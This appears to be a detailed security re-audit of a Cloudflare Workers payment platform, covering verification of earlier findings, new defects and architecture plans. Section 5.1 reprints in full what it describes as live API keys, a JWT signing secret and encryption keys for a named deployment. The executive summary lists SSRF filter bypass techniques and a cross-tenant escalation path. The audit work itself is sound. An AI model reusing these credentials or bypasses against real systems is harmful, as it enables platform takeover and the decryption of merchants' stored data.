# EDGEpay v0.3.0 — Full Re-Audit, Remediation Verification, Multi-Worker Architecture Blueprint & API-Surface Reduction Report

**Audit target:** `edgepay-cf-clean-new.zip` (repository state dated 2026-09-01, version 0.3.0)
**Audit standard:** the strict audit brief supplied by the platform owner (4-pass method: static review → data-integrity/concurrency → runtime/adversarial → threat-model/improvement), applied with one additional mandate from the commissioning request:

1. Verify **every finding of the previous full audit** (49 findings: 7 × P0, 10 × P1, 20 × P2, 12 × P3) against the new code — was it fixed, how, and what remains.
2. Determine how the system should be re-factored into a **multi-worker frontend system** (customer / merchant / admin / core split).
3. Determine how the **API system should be reduced to a customer-facing REST surface only**, with everything else moved behind Cloudflare **Service Bindings**.
4. Evaluate whether **Worker RPC** is the appropriate integration mechanism, with a detailed comparison against every realistic alternative.
5. Deliver a comprehensive report of roughly 100 pages.

---

## Table of Contents

- **Part I — Audit Foundation**
  - 1. Executive Summary
  - 2. Overall Production Readiness
  - 3. Audit Method, Environment & Baseline
- **Part II — Remediation Verification (the 49 previous findings)**
  - 4. Verification Method & Verdict Legend
  - 5. P0 Findings — Detailed Verification (7)
  - 6. P1 Findings — Detailed Verification (10)
  - 7. P2 Findings — Detailed Verification (20)
  - 8. P3 Findings — Detailed Verification (12)
  - 9. Consolidated Remediation Matrix
- **Part III — New Findings Introduced in v0.3.0**
  - 10. New Findings (12)
- **Part IV — Architecture**
  - 11. Current Architecture Reconstruction (what actually exists)
  - 12. The Documented-vs-Actual Four-Worker Topology Gap
  - 13. **The Multi-Worker Frontend System — Full Implementation Blueprint**
  - 14. **API-Surface Reduction to a Customer-Facing REST System**
  - 15. **Cloudflare Service Bindings & Worker RPC — Detailed Evaluation & Comparison**
- **Part V — Financial & Security Deep-Dive (per audit brief)**
  - 16. Payment & Ledger State Machine
  - 17. Ledger Invariants & Posting Protocol Audit
  - 18. Financial Invariant Table
  - 19. Failure-State Matrix
  - 20. Concurrency & Failure Analysis
  - 21. Multi-Tenant Isolation
  - 22. Authentication & Authorization
  - 23. Webhook / Gateway Security
  - 24. Cryptography & Secrets
  - 25. SSRF / XSS / Injection / CSRF / Rate Limiting
  - 26. Queues, Workflows, Cron
  - 27. Observability
  - 28. STRIDE Threat Model
- **Part VI — Deliverables & Verdict**
  - 29. Required Regression Tests (gaps)
  - 30. Remediation Roadmap
  - 31. Final Architecture Scorecard
  - 32. The 17 Executive Questions
  - 33. Final Production Verdict
- **Part VII — Annexes (A-Y)**
  - A. P0 File Deep Reviews (7 files, brief §43)
  - B. Open-Finding Exploit Reproduction Manual (pre-fix)
  - C. Implementation-Ready Fix Specs (P0/P1)
  - D. Complete Route Inventory (67 routes, auth/scope/tenants)
  - E. Complete STRIDE Expansion (13 components × 6 classes)
  - F. Concurrency Interleaving Timelines (open races)
  - G. Four-Worker Split — Complete Code Listings
  - H. Service Binding Comparison — Cost & Latency Models
  - I. Fix Specifications for All Open P2/P3 Findings
  - J. Test Inventory & Gap Map
  - K. Payment Lifecycle Walkthrough (every hop)
  - L. Severity Methodology, Confidence & Glossary
  - M. Full Finding Cards (carried-forward, brief §42 format)
  - N. Topology Option Diagrams (6 options)
  - O. Architecture Decision Records (ADR-001..006)
  - P. wrangler.jsonc Line-Referenced Commentary
  - Q. Free-Tier Capacity Analysis of the Split
  - R. Cross-Reference to Previous Audit's Remediation Table
  - S. Re-Audit Checklist Compliance (brief §43/§45/§46)
  - T. Consolidated Risk Register (sequenced, 34 rows)
  - U. Gateway Adapter Verification Matrix
  - V. Abuse-Case Library (with detection signals)
  - W. Deploy-Button & Operator Runbook Deltas
  - X. What Would Change the Verdict
  - Y. Auditor's Uncertainty Statement

---

# PART I — AUDIT FOUNDATION

---

# 1. Executive Summary

## 1.1 What this audit is

This is a **differential re-audit**. The previous full audit of the EDGEpay repository produced 49 findings (7 P0, 10 P1, 20 P2, 12 P3) and a verdict of **NOT PRODUCTION READY**. The repository owner then produced a new version (`edgepay-cf-clean-new.zip`, v0.3.0) which contains substantial rewrites of the refund pipeline, the ledger posting protocol, the Cloudflare Access gate, the rate-limiting layer, the idempotency middleware, and the checkout page renderer.

This audit answers three questions with code-level evidence:

1. **Which of the 49 previous findings are actually fixed, and how?**
2. **What new defects did the rewrites introduce?**
3. **How should the system now be decomposed into the four-worker topology (customer / merchant / admin / core) using Cloudflare Service Bindings and Worker RPC, with the public API surface reduced to customer-facing REST only?**

## 1.2 Headline results

### Remediation status of the 49 previous findings

| Verdict | Count | Share |
|---|---|---|
| **FIXED** | 5 | 10.2% |
| **PARTIALLY FIXED** | 14 | 28.6% |
| **NOT FIXED** | 30 | 61.2% |

The five fully fixed findings are exactly the **money-correctness P0s**:

- EDGE-P0-002 — refund ledger ID-space confusion → fixed via a complete refund-pipeline rewrite keyed by `m{merchant}:refund:{refundPublicId}`.
- EDGE-P0-003 — unbounded refunds / no ledger reversal → fixed via a single-path `RefundService` with cumulative refund bounds.
- EDGE-P0-004 — callback amount/intent binding → fixed (conditionally) via amount-equality and `trx_id`-binding enforcement in `handleCallback`.
- EDGE-P0-006 — checkout stored XSS → fixed via full-context escaping, `sanitizeBrandColor`, `data-*` + `dataset` + `innerText` rendering, and a mounted CSP on checkout routes.
- EDGE-P0-007 — SMS null-amount bypass → fixed via mandatory exact-amount `cmp()` checks in both the customer-verify path and the SMS corroboration gate.

This is a **genuine and material improvement to financial integrity**: the ledger core plus its feed-paths (refunds, callbacks, SMS corroboration) — the parts that touch money — are now substantially correct, idempotent, and testable. The test suite grew from a broken state to **212 passing tests across 21 files**, including a real-workerd posting-protocol failure-matrix suite that injects crashes at every seam of the Durable-Object/D1 boundary. TypeScript strict typecheck passes cleanly. `npm audit` reports zero known vulnerabilities.

### What is still broken — the security perimeter

The **non-financial perimeter did not get the same treatment**. Of the remaining 44 findings, 30 are entirely untouched:

- **EDGE-P0-001 (live secrets committed) is only cosmetically addressed.** The verification scripts now read `process.env` first — but the same live API key (`op_live_9e9b2a89581d…`) and JWT signing secret (`f14d30e9…`) are still present as **literal fallback values** in `scripts/verify-adversarial.mjs:18-19`, `scripts/verify-all-roles.mjs:18-19`, and `scripts/verify-corroboration.mjs:17`, and the matching `JWT_SECRET`/`APP_KEY`/`ENCRYPTION_KEY` values are committed in `.dev.vars`. Nothing appears rotated; no secret-scanning CI exists. **The prior compromise stands. Rotation remains mandatory and immediate.**
- **EDGE-P0-005 (bootstrap credential chain) is half-fixed.** Production now gets CSPRNG-generated admin password / pairing OTP / API key (good), but the auto-provisioned root API key is still written **in plaintext to Workers KV** (`system:root_api_key`), the install lock is still KV-only (not D1-backed), `/install/bootstrap-key` is a password-oracle endpoint throttled only at 120 req/min/IP, and the bootstrap still auto-runs on the first non-install request of a fresh deployment.
- **EDGE-P1-005 (cross-tenant admin escalation) is NOT fixed.** `GET/POST /api/admin/v1/merchants` still requires only an `admin` scope — no `is_platform` gate. **Any merchant holding an admin-scoped key can still enumerate every merchant and provision new tenants, receiving the new tenant's root API key, pairing OTP, and webhook secret in the response.** The new Cloudflare Access gate in front of `/api/admin/*` helps browser-origin admins, but its bearer-key pass-through path preserves the escalation exactly.
- **EDGE-P1-004 (outbound webhook SSRF) is NOT fixed.** The SSRF filter is still hostname-string matching. IPv6 ULA/link-local, IPv4-mapped IPv6 (`::ffff:127.0.0.1`), integer/hex IP encodings, DNS-rebinding hostnames, and post-redirect targets all bypass it. Deliveries still carry no idempotency key; 400/401/404 responses are still retried.
- **EDGE-P1-002 (mobile pairing OTP brute-force) is NOT fixed.** No rate limiter is mounted on `/api/mobile/v1/pair`; the `'otp'` (10/hour) and `'password'` (10/hour) limiter groups are **defined in code but never mounted anywhere** — dead configuration describing security that does not exist.
- **EDGE-P1-008 (scope gaps) is partially fixed.** Refunds now require `write`, api-keys require `admin` — but `POST /payments` still executes with a **read-only** key, and webhook registration/deletion still executes with a **read-only** key.

### New defects introduced in v0.3.0

Twelve new findings (1 × P1, 6 × P2, 5 × P3), the most significant being: the refund cumulative-bound check is raceable (two concurrent partial refunds both pass); `handleCallback`'s amount check uses `parseFloat` with a ±0.001 tolerance instead of the codebase's own decimal `cmp()`; the amount check is skipped entirely when an adapter fails to echo the amount; the root API key sits in plaintext KV; checkout `verify` endpoints are unthrottled TrxID-oracle surfaces; and the ESLint pipeline is still non-functional (ESLint 9 flat-config missing) while TEST_RESULTS.md claims stale counts.

### Architecture reality

The repository is a **single monolith Worker**. There are **no Service Bindings, no multi-Worker topology, and no Worker RPC** anywhere in `wrangler.jsonc`, `wrangler.dev.jsonc`, `wrangler.staging.jsonc`, or `src/`. The four-worker topology (customer / merchant / admin / core) that the previous brief referenced remains a **documentation aspiration**. Part IV of this report turns that aspiration into a concrete, phased, code-level implementation blueprint using Service Bindings + Worker RPC, and evaluates it against five alternatives in depth.

## 1.3 One-paragraph summary

**The money core is now defensible; the security perimeter is not.** The v0.3.0 rewrite fixed the five payment-integrity P0s with real engineering — a per-tenant LedgerDO posting protocol with write-ahead D1 rows, tx_id dedup, balance guards, and a genuinely convergent reconciliation; a refund workflow that can no longer reverse the wrong ledger row; callback amount binding; strict SMS corroboration; and an escaped, CSP'd checkout page. The 212-test suite, the crash-injection failure matrix, and the clean strict typecheck are the strongest evidence in this codebase's history. But the repository still leaks the same live credential set, still stores a root API key in plaintext KV, still lets any admin-scoped merchant key mint new tenants and harvest their root keys, still ships an OTP pairing surface with no rate limit, and still ships an SSRF filter a first-year attacker can walk around. **The verdict remains NOT PRODUCTION READY** — now for perimeter reasons rather than ledger-correctness reasons. The fastest path to production is: rotate and purge the committed secrets (hours), close P1-005 with a two-line platform gate (hours), mount the already-written OTP limiter (minutes), and replace the SSRF string filter with a real resolver-aware guard (a day). The multi-worker split recommended in Part IV is the correct *next* architecture step, but it is a scale-and-isolation play, not a prerequisite for the first controlled production traffic.

---

# 2. Overall Production Readiness

## 2.1 Verdict

```text
NOT PRODUCTION READY
```

Per the audit brief's verdict rules, NOT PRODUCTION READY is mandatory when any unresolved P0 involves secret compromise, privilege escalation, cross-tenant access, or money integrity. Two prior P0s remain unresolved-in-part, and both are disqualifying on their own:

1. **EDGE-P0-001 (secret compromise).** The live platform API key and JWT signing secret are still committed to the repository as literal fallback values (with `.dev.vars` matching), with no evidence of rotation. Anyone holding this archive holds a `'*'`-scoped key for `https://edgepay-cf.bm-jonybepary.workers.dev`. This alone blocks production.
2. **EDGE-P0-005 → NEW-P1-001 chain (plaintext root key in KV).** A fresh deploy auto-mints a `['read','write','admin','*']`-scoped key and writes it, unencrypted, into Workers KV. Any KV read access (dashboard operator, leaked API token, future code bug that exposes a KV read route) yields platform-root credentials.

Additionally, **EDGE-P1-005** (cross-tenant admin escalation) would independently justify a NO-GO under any multi-tenant deployment, because a single compromised merchant admin key becomes platform-wide tenant creation with root-key harvesting.

## 2.2 What changed versus the previous verdict

The previous NO-GO was driven primarily by *money-correctness* failures (refund ID-space confusion, unbounded refunds, callback substitution, SMS null-amount bypass, checkout XSS). Those are fixed. If the platform were deployed **single-tenant, with secrets rotated, behind Cloudflare Access, with the admin merchant-provisioning routes removed**, the money machinery would now be close to controlled-production quality. The NO-GO reasons have *moved* from the ledger to the perimeter.

## 2.3 Conditions to reach PRODUCTION READY WITH CONDITIONS

All of the following are small, surgical changes (estimate: 2-4 engineer-days including rotation operations):

1. Rotate and purge every committed credential (P0-001): delete literal fallbacks, treat the existing live key and JWT secret as burned, add gitleaks/trufflehog CI.
2. Delete the KV plaintext root key (write it nowhere; surface once through the install wizard, or store only its SHA-256 like every other key).
3. Add the platform gate to `/api/admin/v1/merchants*`: `WHERE is_platform = 1` on the key's merchant, or a dedicated `platform` scope; stop returning `api_key`/`pairing_otp`/`webhook_secret` in provision responses (deliver via a one-time claim flow).
4. Mount `perIpRateLimit('otp')` on `/api/mobile/v1/pair` and `perIpRateLimit('password')` on `/install/bootstrap-key` (the config already exists; it is simply never wired).
5. Add `requireScope('write')` to `POST /payments`, `POST /webhooks`, `DELETE /webhooks/:id`.
6. Replace `isAllowedWebhookUrl` with resolver-aware SSRF validation (resolve hostname → check all returned IPs against private ranges; `redirect: 'error'` on fetch).
7. Add body-size caps (e.g. 128 KB) on webhook and JSON API surfaces.
8. Fix the two residual money-path weaknesses: make `handleCallback`'s amount comparison use `cmp()` (already in `lib/money.ts`) and make the refund cumulative bound race-safe (D1-enforced via a partial unique index or a serialized check in the refund workflow's first step).

## 2.4 Risk top-5 (ranked by financial/business impact)

1. **Committed live credentials, un-rotated (EDGE-P0-001).** Full platform compromise is available to anyone who has ever obtained this zip.
2. **Cross-tenant admin escalation (EDGE-P1-005).** One phished merchant admin key → attacker provisions tenants at will and harvests their root keys, pairings, and webhook secrets.
3. **Plaintext root key in KV + weak bootstrap-key oracle (EDGE-P0-005 residual, NEW-P1-001/002).** 120 req/min/IP password guessing on `/install/bootstrap-key`, plus a dormant root credential in a globally readable namespace.
4. **Refund bound race (NEW-P2-001).** Two concurrent partial refunds can each pass the code-level cumulative check; over-refund beyond captured amount is possible under concurrency.
5. **Outbound SSRF (EDGE-P1-004).** A merchant-configurable webhook URL can be pointed at Cloudflare-internal/admin surfaces via IPv6 ULA, IPv4-mapped IPv6, integer IPs, or redirects.

---

# 3. Audit Method, Environment & Baseline

## 3.1 Method

The audit follows the four-pass method mandated by the brief, adapted for a differential re-audit:

```text
PASS 0 — Baseline & inventory:
         unzip, tree, package.json, typecheck, tests, lint, npm audit,
         config review (wrangler.jsonc × 3), migration review.

PASS 1 — Static architecture + code review:
         full read of the 7 P0-priority files (index.ts, payment.ts,
         ledger-do.ts, auth.ts, cloudflare-access.ts, webhooks.ts,
         crypto.ts); complete read of services/, middleware/, queues/,
         workflows/, cron/, controllers/; targeted reads of gateways/,
         lib/, migrations/, sms-phone-mockup/, scripts/.

PASS 2 — Data integrity + concurrency:
         posting-protocol trace, refund-path trace, callback-path trace,
         SMS-corroboration trace, idempotency race analysis, state-machine
         reconstruction, invariant table, failure matrix.

PASS 3 — Runtime / adversarial:
         execution of the full 212-test suite inside real workerd via
         @cloudflare/vitest-plugin (the suite includes crash-injection at
         the DO/D1 seams); static adversarial probes (route inventory,
         scope analysis, SSRF filter analysis) where a live wrangler dev
         instance was not usable in the audit sandbox.

PASS 4 — Manual threat model + improvement review:
         STRIDE per component; the four-worker decomposition design;
         service-binding/RPC comparison; remediation roadmap.
```

Every verdict in Part II cites **file:line evidence** from the new code, and — where the code has comments claiming a fix — the claim is checked against the implementation, per the brief's rule that documentation is not evidence.

## 3.2 Environment

```text
Repository:   edgepay-cf-clean-new.zip → extracted to repo/edgepay-cf
Version:      0.3.0 (package.json), APP_VERSION "0.3.0"
Framework:    HonoJS 4.11/4.13, zod 3.23/3.25, @hono/zod-validator 0.9
Runtime:      Cloudflare Workers (compatibility_date 2026-08-28, nodejs_compat)
Test stack:   vitest 4.1 / @cloudflare/vitest-plugin 1.1.2 / workerd 1.20260828.1
Wrangler:     4.127.1
Node:         24.19.0 (audit sandbox)
OS:           Linux (container)
Date:         2026-09-01/02
```

## 3.3 Baseline results

| Check | Result | Notes |
|---|---|---|
| `npx tsc --noEmit` | **PASS (exit 0)** | strict mode, zero errors |
| `npx vitest run` | **PASS 212/212** | 21 files, ~7.1s, real workerd |
| `npx eslint src --ext .ts` | **CANNOT RUN** | ESLint 9 requires `eslint.config.js`; repo has none (EDGE-P1-009 residual) |
| `npm audit --audit-level=high` | **0 vulnerabilities** | clean |
| `wrangler deploy --dry-run` | not run in sandbox | config parse reviewed statically; 3 config files present |
| Git history | single commit `6c31bad Initial commit` | no history to mine for secret introduction |

### Test-file inventory (21 files, 212 tests)

```text
access-jwt.test.ts              ES256/RS256 verification, fail-closed tamper vectors
api-middleware.test.ts          CORS allowlist, security headers, zod schemas
api-reference.test.ts           OpenAPI document shape
bd-gateways.test.ts             bKash/Nagad/Rocket/SSLCommerz adapters
catalog-port.test.ts            gateway catalog/aliases
gateway-integrity.test.ts       adapter structural integrity
gateways-enabled.test.ts        ENABLED_GATEWAYS parser (fail-closed on typos)
gateways.test.ts                registry behavior
jwt.test.ts                     JWT issue/verify/refresh
ledger-consistency.test.ts      20-way concurrency, crash-injection property tests
ledger-do.test.ts               posting protocol + failure matrix (D/E/F seams)
money.test.ts                   decimal helpers
payment-edgecases.test.ts       money format / currency / payload boundary
payment-integrity.test.ts       idempotency, refunds-require-key, merchant scoping
port-kit.test.ts                gwFetch/formBody kit
runtime-integrity.test.ts       migration index usage, fault-seam guard, FK-safe pairing
smoke.test.ts                   worker boot, health, error envelope, CORS preflight
sms-corroboration-edgecases.test.ts  ambiguity/amount/currency/gateway gates
sms-parser-adversarial.test.ts  Unicode digits, whitespace, malformed input
tenant-routing.test.ts          cross-tenant 403s, install/assets bypasses
workflow-policy.test.ts         refund poll backoff/halt policy (pure functions)
```

The suite is **genuinely adversarial in the ledger area** — `ledger-do.test.ts` injects failures at the D1-pending, DO-write, and D1-posted seams and asserts convergence after reconciliation; `ledger-consistency.test.ts` runs a 30-posting stream with faults and asserts D1-aggregated balances equal DO balances. This is the strongest part of the repository.

### Documentation-baseline drift

- `TEST_RESULTS.md` still reports "11 files / 104 tests" — the actual suite is 21 files / 212 tests. Stale (EDGE-P3-012 persists).
- `src/index.ts:181` comments "per-IP KV limiter (3/hour)" for install; `rate-limit.ts:37` sets 120/min. Comment/code mismatch persists.
- `src/lib/crypto.ts:11` comments "PBKDF2 with 600,000 iterations"; `crypto.ts:28` sets 50,000. Comment/code mismatch persists.

## 3.4 Repository map (reconstructed, non-generated files)

```text
edgepay-cf/
├── wrangler.jsonc / wrangler.dev.jsonc / wrangler.staging.jsonc   # 1 Worker, 4 envs
├── migrations/ 0001..0004                                          # schema + posting protocol + refund index
├── src/
│   ├── index.ts                       # Hono app, middleware stack, exports
│   ├── config/platform.ts             # central platform config (bootstrap defaults)
│   ├── controllers/  api.ts, admin-api.ts, mobile.ts, checkout.ts,
│   │                  webhooks.ts, install.ts, api-reference.ts
│   ├── services/    payment.ts, refund.ts, ledger.ts, ledger-audit.ts,
│   │                reconciliation.ts, bootstrap.ts, sms-parser.ts,
│   │                sms-corroboration.ts, webhook-dispatcher.ts, custom-hostnames.ts
│   ├── do/          ledger-do.ts      # per-tenant LedgerDO (SQLite-backed)
│   ├── middleware/  auth.ts, cloudflare-access.ts, csrf.ts (dead), domain.ts,
│   │                idempotency.ts, maintenance.ts, rate-limit.ts, security-headers.ts
│   ├── queues/      webhook-consumer.ts, sms-consumer.ts, email-consumer.ts
│   ├── workflows/   refund-reconciliation.ts, reconciliation-sweep.ts
│   ├── cron/        handler.ts
│   ├── gateways/    base.ts, enabled.ts, catalog.ts + 10 BD/API adapters
│   │                + ~90 generated adapters (ports)
│   ├── lib/         crypto.ts, money.ts, jwt.ts, validation.ts, error.ts,
│   │                db.ts, hash.ts, logger.ts, observability.ts, timing-safe.ts,
│   │                ledger-chart.ts
│   ├── openapi.ts   # OpenAPI 3.1 document
│   └── types/       env.ts, db.ts, ledger.ts
├── tests/ (21 files)
├── scripts/ verify-*.mjs (contain leaked-credential fallbacks), bootstrap.sh, set-secrets.sh
├── sms-phone-mockup/ (dev tool: unauthenticated open proxy on 0.0.0.0)
├── docs/ (9 files), public/assets, db/seeds.sql
└── EDGEPAY_AUDIT_REPORT.md (previous audit), EDGEPAY_CF_FULL_AUDIT_REPORT.md (previous full audit)
```

---

# PART II — REMEDIATION VERIFICATION (THE 49 PREVIOUS FINDINGS)

---

# 4. Verification Method & Verdict Legend

Each previous finding was re-verified by:

1. Locating the exact file/line the finding cited in the **new** code.
2. Tracing the full execution path (not just the guard's existence).
3. Identifying the **fix mechanism** (what code changed).
4. Identifying **residual risk** (what the fix does not cover).
5. Checking **regression-test coverage** (does a test actually pin the invariant?).
6. Assigning one of the brief's verdicts:

```text
FIXED              the threat/failure path is closed by implementation,
                   verified by code trace and (ideally) a regression test
PARTIALLY FIXED    the primary path is closed but material residual risk,
                   or a required sub-component, remains
NOT FIXED          the cited code path is materially unchanged
NOT VERIFIABLE     cannot be determined from the repository (unused here)
```

A recurring pattern in this version — important for interpreting everything below — is the **"guard exists, wiring absent"** pattern: several security mechanisms were written and even unit-tested in isolation, but are never mounted into the request path (the OTP/password rate-limit groups; the CSRF middleware; the Analytics Engine binding). **Code that exists but is not wired is not a control.** The previous audit flagged this pattern twice (P2-001, P2-006); v0.3.0 adds a third instance (rate-limit groups) and keeps the first two.

---

# 5. P0 Findings — Detailed Verification (7)

---

## 5.1 EDGE-P0-001 — Live production API key and JWT signing secret committed to the repository

### Previous finding (summary)

`scripts/verify-*.mjs` contained a literal live API key (`op_live_9e9b2a89581d_1be4697dbc9b453cbe513bea64ef4613`, `'*'`-scoped) and the HS256 JWT signing secret (`f14d30e9a38c97b57ac7c3845b64d8307d6233896f7b6d6571892f06c40272f5`) for the deployed worker referenced by `wrangler.jsonc` (`https://edgepay-cf.bm-jonybepary.workers.dev`). Anyone obtaining the archive holds platform-root credentials.

### What changed in v0.3.0

The three verification scripts now read credentials from the environment **first**:

```ts
// scripts/verify-adversarial.mjs:18-19  (identical pattern in verify-all-roles.mjs)
const API_KEY = process.env.EDGE_PAY_ADMIN_KEY || process.env.EDGE_PAY_KEY
             || 'op_live_9e9b2a89581d_1be4697dbc9b453cbe513bea64ef4613';
const JWT_SECRET = process.env.JWT_SECRET
             || 'f14d30e9a38c97b57ac7c3845b64d8307d6233896f7b6d6571892f06c40272f5';
```

Additionally `.dev.vars.example` was added with placeholder values, and `.gitignore` includes `.dev.vars` (although `.dev.vars` itself is present in this archive with the real values).

### What did NOT change

- The **same live key and secret remain in the repository as literal fallbacks**. The env override changes how *operators* run the scripts; it does not remove the committed values from the artifact. Anyone who has this zip still holds the `'*'`-scoped key and the JWT secret.
- `.dev.vars` (committed in the zip, not gitignored in the shipped artifact) contains the matching live values:

```text
JWT_SECRET=f14d30e9… (same secret as the scripts)
APP_KEY=t8PYNmv6hdOQGcwWYwAsmckxcdosgIvV40aSm0ua8bM=
ENCRYPTION_KEY=nIqX5Y/JMyOxmTdKPx0H2QfBSFOWaBf7NwrlqedLGcM=
```

- There is **no evidence of rotation**: no CHANGELOG entry, no comment, and the deployed `APP_URL` in `wrangler.jsonc` is unchanged. The ENCRYPTION_KEY being public is additionally catastrophic for stored data: every AES-256-GCM-encrypted gateway credential and PII field in D1 encrypted under that key is decryptable by the archive holder.
- No secret-scanning CI (no gitleaks/trufflehog config, no GitHub Action), no pre-commit hook. `scripts/set-secrets.sh` exists but is manual.

### Regression test

None possible/needed (operational finding). The remediation must be: purge literals, rotate all four secrets (`JWT_SECRET`, `APP_KEY`, `ENCRYPTION_KEY`, the live API key), re-encrypt stored gateway credentials under the new key, add CI scanning.

### Verdict

```text
PARTIALLY FIXED
```

The env-first pattern is the right long-term shape, but the **exposure itself is unremediated** and the secrets are **un-rotated**. For severity purposes this still functions as a live P0: secret compromise with full-platform material impact. **Rotation and purging remain pre-condition #1 for any deployment.**

---

## 5.2 EDGE-P0-002 — Refund workflow reverses the wrong ledger transaction (ID-space confusion)

### Previous finding (summary)

The refund workflow passed an `op_transactions.id` (payments table row id) where an `op_ledger_transactions.id` (ledger table row id) was required. When numeric ids coincided, an **arbitrary unrelated ledger row** was reversed; when they did not, the reversal silently no-oped because a "not found" error string containing "already reversed" was swallowed as success. Books corrupted or overstated after every refund.

### What changed in v0.3.0 — a complete refund-pipeline rewrite

The refund path was rebuilt end-to-end (refund.ts v0.2.1, refund-reconciliation.ts v0.2.1, ledger.ts `postRefundLedgerEntry`):

1. **No cross-table numeric id is used anywhere.** `RefundService.createRefund` (services/refund.ts:45-162) validates the target transaction (merchant-scoped, `status = 'completed'`), enforces cumulative bounds, writes an `op_refunds` row, and triggers a **per-refund workflow instance** (`refund-{rowId}` — idempotent instance id).
2. **The workflow** (`workflows/refund-reconciliation.ts:88-165`) loads the refund row, polls the gateway in a bounded backoff loop (52 attempts, 1m→30m, ~24h window), and on gateway confirmation calls `finalizeRefund`:
   - `post-ledger-reversal` step → `postRefundLedgerEntry(env, merchant_id, refund.refund_id, amount, currency)` — **keyed by the refund's public ID**, not any numeric row id.
   - `dispatch-webhook` step (retries 5× exponential).
   - `mark-refund-completed` step — `UPDATE ... WHERE id = ? AND status = 'pending'` (guarded, idempotent).
3. **The ledger entry** (services/ledger.ts:394-429) posts inverse entries (debit revenue / credit clearing) with idempotency key:

```ts
{ idempotency_key: `m${merchantId}:refund:${refundPublicId}` }
```

The LedgerDO dedups by `tx_id` (ledger-do.ts:150-160), so step retries, workflow replays, and sweep re-drives all converge to exactly one reversal per refund.

4. The old `LedgerService.reverse(ledgerTransactionId)` (ledger.ts:122-175) still exists but is **no longer called by the refund path**. Its own semantics were also fixed: it now loads by `op_ledger_transactions.id` *within its own table's id space*, uses the original's `uuid` for the idempotency key (`m{m}:reversal:{uuid}`), and flips status with `WHERE id = ? AND status = 'posted'`.

### Evidence the fix is real

- Code trace: refund.ts:153 → `triggerRefundReconciliation(env, refundRowId)` → workflow `finalizeRefund` → ledger.ts:417 `post({...}, { idempotency_key: m{m}:refund:{publicId} })` → DO dedup at ledger-do.ts:150.
- Tests: `ledger-do.test.ts` "is idempotent by tx_id: a replayed webhook/retry returns duplicate and posts nothing"; `ledger-consistency.test.ts` "20 concurrent postings with the SAME tx_id: exactly one posted, 19 duplicates, no double-apply"; `workflow-policy.test.ts` pins the poll/halt policy.
- The workflow header documents the exact fix: "ledger reversal keyed by the original transaction's uuid; status flips guarded by WHERE" (refund-reconciliation.ts:22-24).

### Residual risk

- Low. The reversal amount is the refund row's amount (validated at creation ≤ remaining), not re-read from the ledger, so a DB tamper of `op_refunds.amount` between creation and finalize would reverse a different amount — but that requires direct DB write access (out of threat model; also caught by the DO's balance guard).
- `LedgerService.reverse()` remains as dead-ish code with different id-space semantics — a future caller could reintroduce confusion. Recommend deleting it or renaming with a doc comment.

### Verdict

```text
FIXED
```

---

## 5.3 EDGE-P0-003 — Merchant-API refund path: unbounded refunds, no ledger reversal, immediate "completed"

### Previous finding (summary)

The merchant REST refund endpoint created refund records without any cumulative bound (refund > captured possible, repeated refunds possible), never touched the ledger, and immediately marked the refund `completed`.

### What changed in v0.3.0 — single-path refunds with bounds

`POST /api/v1/refunds` (controllers/api.ts:140-230) now:

1. **Requires an idempotency key** (`X-Idempotency-Key`, 400 without — api.ts:143-148) and runs through the idempotency middleware with `required: true`.
2. Validates the transaction exists **for this merchant** and is `completed` (refund.ts:50-77).
3. **Enforces cumulative refund bounds** (refund.ts:79-101):

```ts
const priorRefunds = SUM(amount) FROM op_refunds
  WHERE transaction_id = ? AND merchant_id = ?
    AND status IN ('completed','pending','processing');
if (totalRefunded + requestedRefund > capturedAmount + 0.001) throw;
```

4. Attempts the **gateway refund** through the adapter (`adapter.refund(...)`) when the tx has a gateway; failures page the operator but still create a pending refund row so the workflow tracks it.
5. Inserts the refund row with status `'pending'` and triggers the reconciliation workflow — the **only** path to `completed` is the workflow's gateway-confirmed finalize, which **posts the ledger reversal first** (see 5.2).
6. `requireScope('write')` is mounted on the route (api.ts:150).

The old immediate-`completed`, no-ledger code path no longer exists anywhere.

### Regression coverage

`payment-integrity.test.ts`:
- "returns 400 when X-Idempotency-Key is missing on POST /refunds"
- idempotent replay of refund creation
- (bounds themselves are covered indirectly; no explicit over-refund test — see §29 gaps)

### Residual risk (material)

1. **The cumulative bound is a code-level check with a TOCTOU race.** Two *concurrent* `POST /refunds` calls for the same transaction each read `totalRefunded` (say 0 of 100 captured), each request 60, each passes the check, both insert → total 120 > 100. The idempotency middleware does not help (different keys). There is **no DB constraint** (no `CHECK`, no trigger, no partial unique index) enforcing `SUM(refunds) ≤ captured` on `op_refunds`, and no serialization point (the refund row insert and bound check are separate statements; nothing runs inside a DO or a D1 batch with the check).
2. The bound check uses `CAST(amount AS NUMERIC)` SUM + `parseFloat` + `+0.001` tolerance — float arithmetic on TEXT money (see NEW-P2-002). Safe for 2-dp amounts within safe-integer range, but inconsistent with the decimal-strict discipline used elsewhere (`money.ts cmp`, `moneyToMinorStrict`).
3. Pending/processing refunds count toward the bound (conservative — good), but a `failed` refund frees its reservation (correct).

### Verdict

```text
FIXED   (with a NEW P2 residual: the concurrency race, see NEW-P2-001)
```

---

## 5.4 EDGE-P0-004 — Redirect-callback completion ignores amount and intent binding (paymentID / val_id substitution)

### Previous finding (summary)

`handleCallback` executed the customer-supplied `paymentID`/`val_id` against the gateway and, on success, completed **this** intent at **this** intent's amount. A customer could complete a 100,000 BDT intent using a 10 BDT payment of their own.

### What changed in v0.3.0 — service-layer binding enforcement

`handleCallback` (services/payment.ts:271-344) now enforces, **after** adapter verification succeeds:

```ts
// payment.ts:314-333
if (verifyResult.success) {
  // 1. Amount equality when the provider echoes it (EDGE-P0-004)
  if (verifyResult.amount) {
    const returnedAmount = parseFloat(verifyResult.amount);
    const expectedAmount = parseFloat(intent.amount);
    if (isNaN(returnedAmount) || Math.abs(returnedAmount - expectedAmount) > 0.001) {
      // mark tx failed (guarded), return amount_mismatch
    }
  }
  // 2. Reference binding when echoed (EDGE-P0-004)
  if (verifyResult.trx_id && verifyResult.trx_id !== intent.trx_id) {
    // mark tx failed (guarded), return trx_id_mismatch
  }
  await this.completeTransaction(intent.trx_db_id, intent.id, verifyResult.gateway_trx_id);
}
```

Both mismatch paths mark the transaction failed **with a status guard** (`AND status IN ('pending','processing','created')`) and return a structured failure.

The `VerifyResult` contract (gateways/base.ts:88-96) now includes `amount: Money | null`, `currency?`, and `trx_id?`. The primary BD adapters populate `amount` from the provider response:

- SSLCommerz (sslcommerz.gateway.ts:144): `amount: (res.data.amount as string) ?? null`
